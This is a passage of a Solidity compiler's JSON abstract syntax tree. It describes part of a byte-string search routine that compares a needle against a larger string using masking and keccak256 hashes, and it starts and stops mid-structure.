														"id": 1048,
														"mutability": "mutable",
														"name": "ptr",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1155,
														"src": "11657:8:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1047,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "11657:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1050,
												"initialValue": {
													"argumentTypes": null,
													"id": 1049,
													"name": "selfptr",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 1038,
													"src": "11668:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "11657:18:0"
											},
											{
												"assignments": [
													1052
												],
												"declarations": [
													{
														"constant": false,
														"id": 1052,
														"mutability": "mutable",
														"name": "idx",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1155,
														"src": "11686:8:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1051,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "11686:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1053,
												"initialValue": null,
												"nodeType": "VariableDeclarationStatement",
												"src": "11686:8:0"
											},
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 1056,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 1054,
														"name": "needlelen",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1040,
														"src": "11711:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "<=",
													"rightExpression": {
														"argumentTypes": null,
														"id": 1055,
														"name": "selflen",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1036,
														"src": "11724:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "11711:20:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 1150,
												"nodeType": "IfStatement",
												"src": "11707:1201:0",
												"trueBody": {
													"id": 1149,
													"nodeType": "Block",
													"src": "11733:1175:0",
													"statements": [
														{
															"condition": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"id": 1059,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"id": 1057,
																	"name": "needlelen",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1040,
																	"src": "11752:9:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "<=",
																"rightExpression": {
																	"argumentTypes": null,
																	"hexValue": "3332",
																	"id": 1058,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "11765:2:0",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_32_by_1",
																		"typeString": "int_const 32"
																	},
																	"value": "32"
																},
																"src": "11752:15:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"falseBody": {
																"id": 1147,
																"nodeType": "Block",
																"src": "12419:478:0",
																"statements": [
																	{
																		"assignments": [
																			1116
																		],
																		"declarations": [
																			{
																				"constant": false,
																				"id": 1116,
																				"mutability": "mutable",
																				"name": "hash",
																				"nodeType": "VariableDeclaration",
																				"overrides": null,
																				"scope": 1147,
																				"src": "12488:12:0",
																				"stateVariable": false,
																				"storageLocation": "default",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bytes32",
																					"typeString": "bytes32"
																				},
																				"typeName": {
																					"id": 1115,
																					"name": "bytes32",
																					"nodeType": "ElementaryTypeName",
																					"src": "12488:7:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_bytes32",
																						"typeString": "bytes32"
																					}
																				},
																				"value": null,
																				"visibility": "internal"
																			}
																		],
																		"id": 1117,
																		"initialValue": null,
																		"nodeType": "VariableDeclarationStatement",
																		"src": "12488:12:0"
																	},
																	{
																		"AST": {
																			"nodeType": "YulBlock",
																			"src": "12528:43:0",
																			"statements": [
																				{
																					"nodeType": "YulAssignment",
																					"src": "12530:39:0",
																					"value": {
																						"arguments": [
																							{
																								"name": "needleptr",
																								"nodeType": "YulIdentifier",
																								"src": "12548:9:0"
																							},
																							{
																								"name": "needlelen",
																								"nodeType": "YulIdentifier",
																								"src": "12559:9:0"
																							}
																						],
																						"functionName": {
																							"name": "keccak256",
																							"nodeType": "YulIdentifier",
																							"src": "12538:9:0"
																						},
																						"nodeType": "YulFunctionCall",
																						"src": "12538:31:0"
																					},
																					"variableNames": [
																						{
																							"name": "hash",
																							"nodeType": "YulIdentifier",
																							"src": "12530:4:0"
																						}
																					]
																				}
																			]
																		},
																		"evmVersion": "istanbul",
																		"externalReferences": [
																			{
																				"declaration": 1116,
																				"isOffset": false,
																				"isSlot": false,
																				"src": "12530:4:0",
																				"valueSize": 1
																			},
																			{
																				"declaration": 1040,
																				"isOffset": false,
																				"isSlot": false,
																				"src": "12559:9:0",
																				"valueSize": 1
																			},
																			{
																				"declaration": 1042,
																				"isOffset": false,
																				"isSlot": false,
																				"src": "12548:9:0",
																				"valueSize": 1
																			}
																		],
																		"id": 1118,
																		"nodeType": "InlineAssembly",
																		"src": "12519:52:0"
																	},
																	{
																		"body": {
																			"id": 1145,
																			"nodeType": "Block",
																			"src": "12640:242:0",
																			"statements": [
																				{
																					"assignments": [
																						1132
																					],
																					"declarations": [
																						{
																							"constant": false,
																							"id": 1132,
																							"mutability": "mutable",
																							"name": "testHash",
																							"nodeType": "VariableDeclaration",
																							"overrides": null,
																							"scope": 1145,
																							"src": "12663:16:0",
																							"stateVariable": false,
																							"storageLocation": "default",
																							"typeDescriptions": {
																								"typeIdentifier": "t_bytes32",
																								"typeString": "bytes32"
																							},
																							"typeName": {
																								"id": 1131,
																								"name": "bytes32",
																								"nodeType": "ElementaryTypeName",
																								"src": "12663:7:0",
																								"typeDescriptions": {
																									"typeIdentifier": "t_bytes32",
																									"typeString": "bytes32"
																								}
																							},
																							"value": null,
																							"visibility": "internal"
																						}
																					],
																					"id": 1133,
																					"initialValue": null,
																					"nodeType": "VariableDeclarationStatement",
																					"src": "12663:16:0"
																				},
																				{
																					"AST": {
																						"nodeType": "YulBlock",
																						"src": "12711:41:0",
																						"statements": [
																							{
																								"nodeType": "YulAssignment",
																								"src": "12713:37:0",
																								"value": {
																									"arguments": [
																										{
																											"name": "ptr",
																											"nodeType": "YulIdentifier",
																											"src": "12735:3:0"
																										},
																										{
																											"name": "needlelen",
																											"nodeType": "YulIdentifier",
																											"src": "12740:9:0"
																										}
																									],
																									"functionName": {
																										"name": "keccak256",
																										"nodeType": "YulIdentifier",
																										"src": "12725:9:0"
																									},
																									"nodeType": "YulFunctionCall",
																									"src": "12725:25:0"
																								},
																								"variableNames": [
																									{
																										"name": "testHash",
																										"nodeType": "YulIdentifier",
																										"src": "12713:8:0"
																									}
																								]
																							}
																						]
																					},
																					"evmVersion": "istanbul",
																					"externalReferences": [
																						{
																							"declaration": 1040,
																							"isOffset": false,
																							"isSlot": false,
																							"src": "12740:9:0",
																							"valueSize": 1
																						},
																						{
																							"declaration": 1048,
																							"isOffset": false,
																							"isSlot": false,
																							"src": "12735:3:0",
																							"valueSize": 1
																						},
																						{
																							"declaration": 1132,
																							"isOffset": false,
																							"isSlot": false,
																							"src": "12713:8:0",
																							"valueSize": 1
																						}
																					],
																					"id": 1134,
																					"nodeType": "InlineAssembly",
																					"src": "12702:50:0"
																				},
																				{
																					"condition": {
																						"argumentTypes": null,
																						"commonType": {
																							"typeIdentifier": "t_bytes32",
																							"typeString": "bytes32"
																						},
																						"id": 1137,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"leftExpression": {
																							"argumentTypes": null,
																							"id": 1135,
																							"name": "hash",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 1116,
																							"src": "12778:4:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_bytes32",
																								"typeString": "bytes32"
																							}
																						},
																						"nodeType": "BinaryOperation",
																						"operator": "==",
																						"rightExpression": {
																							"argumentTypes": null,
																							"id": 1136,
																							"name": "testHash",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 1132,
																							"src": "12786:8:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_bytes32",
																								"typeString": "bytes32"
																							}
																						},
																						"src": "12778:16:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_bool",
																							"typeString": "bool"
																						}
																					},
																					"falseBody": null,
																					"id": 1140,
																					"nodeType": "IfStatement",
																					"src": "12774:57:0",
																					"trueBody": {
																						"expression": {
																							"argumentTypes": null,
																							"id": 1138,
																							"name": "ptr",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 1048,
																							"src": "12828:3:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"functionReturnParameters": 1046,
																						"id": 1139,
																						"nodeType": "Return",
																						"src": "12821:10:0"
																					}
																				},
																				{
																					"expression": {
																						"argumentTypes": null,
																						"id": 1143,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"leftHandSide": {
																							"argumentTypes": null,
																							"id": 1141,
																							"name": "ptr",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 1048,
																							"src": "12854:3:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"nodeType": "Assignment",
																						"operator": "+=",
																						"rightHandSide": {
																							"argumentTypes": null,
																							"hexValue": "31",
																							"id": 1142,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": true,
																							"kind": "number",
																							"lValueRequested": false,
																							"nodeType": "Literal",
																							"src": "12861:1:0",
																							"subdenomination": null,
																							"typeDescriptions": {
																								"typeIdentifier": "t_rational_1_by_1",
																								"typeString": "int_const 1"
																							},
																							"value": "1"
																						},
																						"src": "12854:8:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					},
																					"id": 1144,
																					"nodeType": "ExpressionStatement",
																					"src": "12854:8:0"
																				}
																			]
																		},
																		"condition": {
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			},
																			"id": 1127,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"id": 1123,
																				"name": "idx",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 1052,
																				"src": "12605:3:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "<=",
																			"rightExpression": {
																				"argumentTypes": null,
																				"commonType": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				},
																				"id": 1126,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftExpression": {
																					"argumentTypes": null,
																					"id": 1124,
																					"name": "selflen",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 1036,
																					"src": "12612:7:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"nodeType": "BinaryOperation",
																				"operator": "-",
																				"rightExpression": {
																					"argumentTypes": null,
																					"id": 1125,
																					"name": "needlelen",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 1040,
																					"src": "12622:9:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"src": "12612:19:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"src": "12605:26:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		},
																		"id": 1146,
																		"initializationExpression": {
																			"expression": {
																				"argumentTypes": null,
																				"id": 1121,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftHandSide": {
																					"argumentTypes": null,
																					"id": 1119,
																					"name": "idx",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 1052,
																					"src": "12596:3:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"nodeType": "Assignment",
																				"operator": "=",
																				"rightHandSide": {
																					"argumentTypes": null,
																					"hexValue": "30",
																					"id": 1120,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "12602:1:0",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_0_by_1",
																						"typeString": "int_const 0"
																					},
																					"value": "0"
																				},
																				"src": "12596:7:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"id": 1122,
																			"nodeType": "ExpressionStatement",
																			"src": "12596:7:0"
																		},
																		"loopExpression": {
																			"expression": {
																				"argumentTypes": null,
																				"id": 1129,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"nodeType": "UnaryOperation",
																				"operator": "++",
																				"prefix": false,
																				"src": "12633:5:0",
																				"subExpression": {
																					"argumentTypes": null,
																					"id": 1128,
																					"name": "idx",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 1052,
																					"src": "12633:3:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"id": 1130,
																			"nodeType": "ExpressionStatement",
																			"src": "12633:5:0"
																		},
																		"nodeType": "ForStatement",
																		"src": "12591:291:0"
																	}
																]
															},
															"id": 1148,
															"nodeType": "IfStatement",
															"src": "11748:1149:0",
															"trueBody": {
																"id": 1114,
																"nodeType": "Block",
																"src": "11769:644:0",
																"statements": [
																	{
																		"assignments": [
																			1061
																		],
																		"declarations": [
																			{
																				"constant": false,
																				"id": 1061,
																				"mutability": "mutable",
																				"name": "mask",
																				"nodeType": "VariableDeclaration",
																				"overrides": null,
																				"scope": 1114,
																				"src": "11788:12:0",
																				"stateVariable": false,
																				"storageLocation": "default",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bytes32",
																					"typeString": "bytes32"
																				},
																				"typeName": {
																					"id": 1060,
																					"name": "bytes32",
																					"nodeType": "ElementaryTypeName",
																					"src": "11788:7:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_bytes32",
																						"typeString": "bytes32"
																					}
																				},
																				"value": null,
																				"visibility": "internal"
																			}
																		],
																		"id": 1078,
																		"initialValue": {
																			"argumentTypes": null,
																			"arguments": [
																				{
																					"argumentTypes": null,
																					"id": 1076,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"lValueRequested": false,
																					"nodeType": "UnaryOperation",
																					"operator": "~",
																					"prefix": true,
																					"src": "11811:34:0",
																					"subExpression": {
																						"argumentTypes": null,
																						"components": [
																							{
																								"argumentTypes": null,
																								"commonType": {
																									"typeIdentifier": "t_uint256",
																									"typeString": "uint256"
																								},
																								"id": 1074,
																								"isConstant": false,
																								"isLValue": false,
																								"isPure": false,
																								"lValueRequested": false,
																								"leftExpression": {
																									"argumentTypes": null,
																									"commonType": {
																										"typeIdentifier": "t_uint256",
																										"typeString": "uint256"
																									},
																									"id": 1072,
																									"isConstant": false,
																									"isLValue": false,
																									"isPure": false,
																									"lValueRequested": false,
																									"leftExpression": {
																										"argumentTypes": null,
																										"hexValue": "32",
																										"id": 1064,
																										"isConstant": false,
																										"isLValue": false,
																										"isPure": true,
																										"kind": "number",
																										"lValueRequested": false,
																										"nodeType": "Literal",
																										"src": "11813:1:0",
																										"subdenomination": null,
																										"typeDescriptions": {
																											"typeIdentifier": "t_rational_2_by_1",
																											"typeString": "int_const 2"
																										},
																										"value": "2"
																									},
																									"nodeType": "BinaryOperation",
																									"operator": "**",
																									"rightExpression": {
																										"argumentTypes": null,
																										"components": [
																											{
																												"argumentTypes": null,
																												"commonType": {
																													"typeIdentifier": "t_uint256",
																													"typeString": "uint256"
																												},
																												"id": 1070,
																												"isConstant": false,
																												"isLValue": false,
																												"isPure": false,
																												"lValueRequested": false,
																												"leftExpression": {
																													"argumentTypes": null,
																													"hexValue": "38",
																													"id": 1065,
																													"isConstant": false,
																													"isLValue": false,
																													"isPure": true,
																													"kind": "number",
																													"lValueRequested": false,
																													"nodeType": "Literal",
																													"src": "11819:1:0",
																													"subdenomination": null,
																													"typeDescriptions": {
																														"typeIdentifier": "t_rational_8_by_1",
																														"typeString": "int_const 8"
																													},
																													"value": "8"
																												},
																												"nodeType": "BinaryOperation",
																												"operator": "*",
																												"rightExpression": {
																													"argumentTypes": null,
																													"components": [
																														{
																															"argumentTypes": null,
																															"commonType": {
																																"typeIdentifier": "t_uint256",
																																"typeString": "uint256"
																															},
																															"id": 1068,
																															"isConstant": false,
																															"isLValue": false,
																															"isPure": false,
																															"lValueRequested": false,
																															"leftExpression": {
																																"argumentTypes": null,
																																"hexValue": "3332",
																																"id": 1066,
																																"isConstant": false,
																																"isLValue": false,
																																"isPure": true,
																																"kind": "number",
																																"lValueRequested": false,
																																"nodeType": "Literal",
																																"src": "11824:2:0",
																																"subdenomination": null,
																																"typeDescriptions": {
																																	"typeIdentifier": "t_rational_32_by_1",
																																	"typeString": "int_const 32"
																																},
																																"value": "32"
																															},
																															"nodeType": "BinaryOperation",
																															"operator": "-",
																															"rightExpression": {
																																"argumentTypes": null,
																																"id": 1067,
																																"name": "needlelen",
																																"nodeType": "Identifier",
																																"overloadedDeclarations": [],
																																"referencedDeclaration": 1040,
																																"src": "11829:9:0",
																																"typeDescriptions": {
																																	"typeIdentifier": "t_uint256",
																																	"typeString": "uint256"
																																}
																															},
																															"src": "11824:14:0",
																															"typeDescriptions": {
																																"typeIdentifier": "t_uint256",
																																"typeString": "uint256"
																															}
																														}
																													],
																													"id": 1069,
																													"isConstant": false,
																													"isInlineArray": false,
																													"isLValue": false,
																													"isPure": false,
																													"lValueRequested": false,
																													"nodeType": "TupleExpression",
																													"src": "11823:16:0",
																													"typeDescriptions": {
																														"typeIdentifier": "t_uint256",
																														"typeString": "uint256"
																													}
																												},
																												"src": "11819:20:0",
																												"typeDescriptions": {
																													"typeIdentifier": "t_uint256",
																													"typeString": "uint256"
																												}
																											}
																										],
																										"id": 1071,
																										"isConstant": false,
																										"isInlineArray": false,
																										"isLValue": false,
																										"isPure": false,
																										"lValueRequested": false,
																										"nodeType": "TupleExpression",
																										"src": "11818:22:0",
																										"typeDescriptions": {
																											"typeIdentifier": "t_uint256",
																											"typeString": "uint256"
																										}
																									},
																									"src": "11813:27:0",
																									"typeDescriptions": {
																										"typeIdentifier": "t_uint256",
																										"typeString": "uint256"
																									}
																								},
																								"nodeType": "BinaryOperation",
																								"operator": "-",
																								"rightExpression": {
																									"argumentTypes": null,
																									"hexValue": "31",
																									"id": 1073,
																									"isConstant": false,
																									"isLValue": false,
																									"isPure": true,
																									"kind": "number",
																									"lValueRequested": false,
																									"nodeType": "Literal",
																									"src": "11843:1:0",
																									"subdenomination": null,
																									"typeDescriptions": {
																										"typeIdentifier": "t_rational_1_by_1",
																										"typeString": "int_const 1"
																									},
																									"value": "1"
																								},
																								"src": "11813:31:0",
																								"typeDescriptions": {
																									"typeIdentifier": "t_uint256",
																									"typeString": "uint256"
																								}
																							}
																						],
																						"id": 1075,
																						"isConstant": false,
																						"isInlineArray": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"nodeType": "TupleExpression",
																						"src": "11812:33:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					},
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				],
																				"id": 1063,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"lValueRequested": false,
																				"nodeType": "ElementaryTypeNameExpression",
																				"src": "11803:7:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_type$_t_bytes32_$",
																					"typeString": "type(bytes32)"
																				},
																				"typeName": {
																					"id": 1062,
																					"name": "bytes32",
																					"nodeType": "ElementaryTypeName",
																					"src": "11803:7:0",
																					"typeDescriptions": {
																						"typeIdentifier": null,
																						"typeString": null
																					}
																				}
																			},
																			"id": 1077,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"kind": "typeConversion",
																			"lValueRequested": false,
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "11803:43:0",
																			"tryCall": false,
																			"typeDescriptions": {
																				"typeIdentifier": "t_bytes32",
																				"typeString": "bytes32"
																			}
																		},
																		"nodeType": "VariableDeclarationStatement",
																		"src": "11788:58:0"
																	},
																	{
																		"assignments": [
																			1080
																		],
																		"declarations": [
																			{
																				"constant": false,
																				"id": 1080,
																				"mutability": "mutable",
																				"name": "needledata",
																				"nodeType": "VariableDeclaration",
																				"overrides": null,
																				"scope": 1114,
																				"src": "11867:18:0",
																				"stateVariable": false,
																				"storageLocation": "default",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bytes32",
																					"typeString": "bytes32"
																				},
																				"typeName": {
																					"id": 1079,
																					"name": "bytes32",
																					"nodeType": "ElementaryTypeName",
																					"src": "11867:7:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_bytes32",
																						"typeString": "bytes32"
																					}
																				},
																				"value": null,
																				"visibility": "internal"
																			}
																		],
																		"id": 1081,
																		"initialValue": null,
																		"nodeType": "VariableDeclarationStatement",
																		"src": "11867:18:0"
																	},
																	{
																		"AST": {
																			"nodeType": "YulBlock",
																			"src": "11913:45:0",
																			"statements": [
																				{
																					"nodeType": "YulAssignment",
																					"src": "11915:41:0",
																					"value": {
																						"arguments": [
																							{
																								"arguments": [
																									{
																										"name": "needleptr",
																										"nodeType": "YulIdentifier",
																										"src": "11939:9:0"
																									}
																								],
																								"functionName": {
																									"name": "mload",
																									"nodeType": "YulIdentifier",
																									"src": "11933:5:0"
																								},
																								"nodeType": "YulFunctionCall",
																								"src": "11933:16:0"
																							},
																							{
																								"name": "mask",
																								"nodeType": "YulIdentifier",
																								"src": "11951:4:0"
																							}
																						],
																						"functionName": {
																							"name": "and",
																							"nodeType": "YulIdentifier",
																							"src": "11929:3:0"
																						},
																						"nodeType": "YulFunctionCall",
																						"src": "11929:27:0"
																					},
																					"variableNames": [
																						{
																							"name": "needledata",
																							"nodeType": "YulIdentifier",
																							"src": "11915:10:0"
																						}
																					]
																				}
																			]
																		},
																		"evmVersion": "istanbul",
																		"externalReferences": [
																			{
																				"declaration": 1061,
																				"isOffset": false,
																				"isSlot": false,
																				"src": "11951:4:0",
																				"valueSize": 1
																			},
																			{
																				"declaration": 1080,
																				"isOffset": false,
																				"isSlot": false,
																				"src": "11915:10:0",
																				"valueSize": 1
																			},
																			{
																				"declaration": 1042,
																				"isOffset": false,
																				"isSlot": false,
																				"src": "11939:9:0",
																				"valueSize": 1
																			}
																		],
																		"id": 1082,
																		"nodeType": "InlineAssembly",
																		"src": "11904:54:0"
																	},
																	{
																		"assignments": [
																			1084
																		],
																		"declarations": [
																			{
																				"constant": false,
																				"id": 1084,
																				"mutability": "mutable",
																				"name": "end",
																				"nodeType": "VariableDeclaration",
																				"overrides": null,
																				"scope": 1114,
																				"src": "11978:8:0",
																				"stateVariable": false,
																				"storageLocation": "default",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				},
																				"typeName": {
																					"id": 1083,
																					"name": "uint",
																					"nodeType": "ElementaryTypeName",
																					"src": "11978:4:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"value": null,
																				"visibility": "internal"
																			}
																		],
																		"id": 1090,
																		"initialValue": {
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			},
																			"id": 1089,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"commonType": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				},
																				"id": 1087,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftExpression": {
																					"argumentTypes": null,
																					"id": 1085,
																					"name": "selfptr",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 1038,
																					"src": "11989:7:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"nodeType": "BinaryOperation",
																				"operator": "+",
																				"rightExpression": {
																					"argumentTypes": null,
																					"id": 1086,
																					"name": "selflen",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 1036,
																					"src": "11999:7:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"src": "11989:17:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "-",
																			"rightExpression": {
																				"argumentTypes": null,
																				"id": 1088,
																				"name": "needlelen",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 1040,
																				"src": "12009:9:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"src": "11989:29:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"nodeType": "VariableDeclarationStatement",
																		"src": "11978:40:0"
																	},
																	{
																		"assignments": [
																			1092
																		],
																		"declarations": [
																			{
																				"constant": false,
																				"id": 1092,
																				"mutability": "mutable",
																				"name": "ptrdata",
																				"nodeType": "VariableDeclaration",
																				"overrides": null,
																				"scope": 1114,
																				"src": "12037:15:0",
																				"stateVariable": false,
																				"storageLocation": "default",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bytes32",
																					"typeString": "bytes32"
																				},
																				"typeName": {
																					"id": 1091,
																					"name": "bytes32",
																					"nodeType": "ElementaryTypeName",
																					"src": "12037:7:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_bytes32",
																						"typeString": "bytes32"
																					}
																				},
																				"value": null,
																				"visibility": "internal"
																			}
																		],
																		"id": 1093,
																		"initialValue": null,
																		"nodeType": "VariableDeclarationStatement",
																		"src": "12037:15:0"
																	},
																	{
																		"AST": {
																			"nodeType": "YulBlock",
																			"src": "12080:36:0",
																			"statements": [
																				{
																					"nodeType": "YulAssignment",
																					"src": "12082:32:0",
																					"value": {
																						"arguments": [
																							{
																								"arguments": [
																									{
																										"name": "ptr",
																										"nodeType": "YulIdentifier",
																										"src": "12103:3:0"
																									}
																								],
																								"functionName": {
																									"name": "mload",
																									"nodeType": "YulIdentifier",
																									"src": "12097:5:0"
																								},
																								"nodeType": "YulFunctionCall",
																								"src": "12097:10:0"
																							},
																							{
																								"name": "mask",
																								"nodeType": "YulIdentifier",
																								"src": "12109:4:0"
																							}
																						],
																						"functionName": {
																							"name": "and",
																							"nodeType": "YulIdentifier",
																							"src": "12093:3:0"
																						},
																						"nodeType": "YulFunctionCall",
																						"src": "12093:21:0"
																					},
																					"variableNames": [
																						{
																							"name": "ptrdata",
																							"nodeType": "YulIdentifier",
																							"src": "12082:7:0"
																						}
																					]
																				}
																			]
																		},
																		"evmVersion": "istanbul",
																		"externalReferences": [
																			{
																				"declaration": 1061,
																				"isOffset": false,
																				"isSlot": false,
																				"src": "12109:4:0",
																				"valueSize": 1
																			},
																			{
																				"declaration": 1048,
																				"isOffset": false,
																				"isSlot": false,
																				"src": "12103:3:0",
																				"valueSize": 1
																			},
																			{
																				"declaration": 1092,
																				"isOffset": false,
																				"isSlot": false,
																				"src": "12082:7:0",
																				"valueSize": 1
																			}
																		],
																		"id": 1094,
																		"nodeType": "InlineAssembly",
																		"src": "12071:45:0"
																	},
																	{
																		"body": {
																			"id": 1110,
																			"nodeType": "Block",
																			"src": "12166:203:0",
